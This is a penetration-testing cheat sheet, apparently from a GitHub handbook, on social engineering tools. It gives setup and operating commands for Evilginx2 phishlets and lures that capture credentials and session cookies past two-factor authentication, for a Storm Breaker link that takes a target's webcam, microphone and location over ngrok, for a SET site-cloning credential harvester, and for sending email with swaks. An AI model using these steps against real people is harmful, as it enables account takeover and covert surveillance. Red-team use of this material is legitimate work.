# Social Engineering Tools

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#Resources)

## Table of Contents

- [Evilginx2](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#Evilginx2)
- [Gophish](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#Gophish)
- [Storm Breaker](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#Storm-Breaker)
- [The Social Engineering Toolkit (SET)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/13_social_engineering_tools.md#The-Social-Engineering-Toolkit-SET)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BlackPhish | Super lightweight with many features and blazing fast speeds. | https://github.com/iinc0gnit0/BlackPhish |
| Evilginx2 Phishlets | Evilginx2 Phishlets version (0.2.3) Only For Testing/Learning Purposes | https://github.com/An0nUD4Y/Evilginx2-Phishlets |
| evilginx2 | Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication | https://github.com/kgretzky/evilginx2 |
| evilgophish | evilginx2 + gophish | https://github.com/fin3ss3g0d/evilgophish |
| EvilnoVNC | Ready to go Phishing Platform | https://github.com/JoelGMSec/EvilnoVNC |
| Gophish | Open-Source Phishing Toolkit | https://github.com/gophish/gophish |
| Nexphisher | Advanced Phishing tool for Linux & Termux | https://github.com/htr-tech/nexphisher |
| SocialFish | Phishing Tool & Information Collector  | https://github.com/UndeadSec/SocialFish |
| SniperPhish | SniperPhish - The Web-Email Spear Phishing Toolkit | https://github.com/GemGeorge/SniperPhish |
| Storm Breaker | Social engineering tool [Access Webcam & Microphone & Location Finder] With {Py,JS,PHP} | https://github.com/ultrasecurity/Storm-Breaker |
| The Social-Engineer Toolkit (SET) | The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. | https://github.com/trustedsec/social-engineer-toolkit |

## Evilginx2

> https://help.evilginx.com/docs/getting-started/building

> https://help.evilginx.com/docs/getting-started/quick-start

> https://help.evilginx.com/docs/guides/phishlets

### Installation

```c
$ sudo apt-get install golang
$ git clone https://github.com/kgretzky/evilginx2.git
$ cd evilginx2
$ make
$ sudo ./build/evilginx -p ./phishlets
```

#### Alternatively with Redirectors

```c
$ sudo ./build/evilginx -p ./phishlets -t ./redirectors -developer
```

### Basic Commands

```c
: phishlets
: lures
: sessions
```

### Prepare Certificates

```c
$ sudo cp /root/.evilginx/crt/ca.crt /usr/local/share/ca-certificates/evilginx.crt
$ sudo update-ca-certificates
```

### Domain Setup

```c
: config domain <DOMAIN>
: config ipv4 <LHOST>
```

### Phishlets

> https://help.evilginx.com/docs/guides/phishlets

> https://github.com/An0nUD4Y/Evilginx2-Phishlets

```c
: phishlets hostname <PHISHLET> <DOMAIN>
: phishlets enable <PHISHLET>
```

### Lures

> https://help.evilginx.com/docs/guides/lures

```c
: lures create <PHISHLET>
: lures get-url <ID>
```

### Session Handling

```c
: sessions
: sessions <ID>
```

## Gophish

> https://github.com/sdcampbell/Internal-Pentest-Playbook

> https://www.ired.team/offensive-security/initial-access/phishing-with-gophish-and-digitalocean

### Port Forwarding

```c
$ ssh -i ~/.ssh/<SSH_KEY> root@<RHOST> -p <RPORT> -L3333:localhost:3333 -N -f
```

## Storm Breaker

> https://medium.com/@frost1/access-location-camera-microphone-of-any-device-547c5b9907f3

### Installation

```c
$ git clone https://github.com/ultrasecurity/Storm-Breaker.git
$ cd Storm-Breaker
$ sudo bash install.sh
$ sudo python3 -m pip install -r requirements.txt
$ sudo python3 st.py
```

### Start ngrok Agent

```c
$ ngrok http 2525
```

> http://8d0b-92-180-8-97.ngrok-free.app -> http://localhost:2525

| Username | Password |
| --- | --- |
| admin | admin |

Chose a link to send to the target.

> http://8d0b-92-180-8-97.ngrok-free.app/templates/nearyou/index.html

## The Social Engineering Toolkit (SET)

### Credential Harvesting

```c
$ sudo setoolkit
```

Navigate to `Social-Engineering Attacks` > `Website Attack Vectors` > `Credential Harvester Attack` > `Site Cloner` == `1`, `2`, `3`, `2`.

```c
$ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --port 25 --body <FILE>.txt
```
